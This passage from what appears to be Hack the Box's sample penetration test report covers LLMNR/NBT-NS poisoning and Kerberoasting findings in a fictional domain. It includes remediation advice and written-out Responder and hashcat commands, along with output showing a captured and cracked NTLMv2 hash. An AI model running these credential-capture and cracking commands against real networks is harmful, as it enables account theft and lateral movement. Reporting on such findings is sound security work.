{"text": "level.  Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of MiTM activity. External References https://attack.mitre.org/techniques/T1557/001/ Finding Evidence: 18\\nRunning the Responder tool to attempt to obtain user account password hashes. $ sudo responder -I eth0 -wrfv __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.6.0 <SNIP> [+] Generic Options: Responder NIC [eth0] Responder IP [192.168.195.168] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-TWWXTGD94CV] Responder Domain Name [3BKZ.LOCAL] Responder DCE-RPC Port [47032] [+] Listening for events... <SNIP> [SMB] NTLMv2-SSP Client : 192.168.195.205 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\bsmith [SMB] NTLMv2-SSP Hash : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FA AA50000000002000800330042004B005A0001001E00570049004E002D0054005700570058005400470044003900340043005600040034 00570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D80106000400020000000800300030000000000000000100000000 2000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A0010000000000000000000000000000000000 00900280063006900660073002F003100390032002E003100360038002E003100390035002E0031003600380000000000000000000000 0000 <SNIP> Figure 18: Running Responder Successfully cracking a password hash with Hashcat to reveal the clear text password value. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 19: Cracking a Password with Hashcat 19\\n2. Weak Kerberos Authentication (“Kerberoasting”) - High CWE CWE-522 CVSS 3.1 Score 9.5 In an Active Directory (AD) environment, Service Principal Names (SPNs) are used to uniquely identify instances of a Windows service. Kerberos authentication requires that each SPN be associated with one service account (Active Directory user account). Any authenticated AD user can request one or more Kerberos Ticket-Granting Service (TGS) tickets from the domain Description (Incl. Root controller for any SPN accounts. These tickets are encrypted with the associated AD account’s Cause) NTLM password hash. They can be brute forced offline using a password cracking tool such as Hashcat if a weak password is used along with the RC4 encryption algorithm. If AES encryption is in use, it will take more resources to “crack” a ticket to reveal the account’s clear-text password, but it is possible if weak passwords are in use. A successful Kerberoasting attack along with cracked passwords could lead to lateral movement and privilege escalation in an AD environment. If a password is cracked for a Security Impact Domain Administrator account or equivalent, an attacker could gain control over most, if not all, resources in the domain. Affected Domain  INLANEFREIGHT.LOCAL Where possible eliminate SPNs in the environment in favor of Group Managed Service Accounts (gMSA) which are not subject to this type of attack. If migration to gMSAs is not possible the following steps will help mitigate the risk of this attack: Remediation  Enable AES Kerberos encryption instead of RC4  Use strong 25+ character passwords for service accounts and rotate them periodically  Limit the privileges of service accounts and avoid creating SPNs tied to highly privileged accounts such as Domain Administrators External References https://attack.mitre.org/techniques/T1558/003/ Finding Evidence: Retrieving a listing all SPN accounts in the INLANEFREIGHT.LOCAL domain using the GetUserSPNs.py tool from the Impacket toolkit.", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 10}}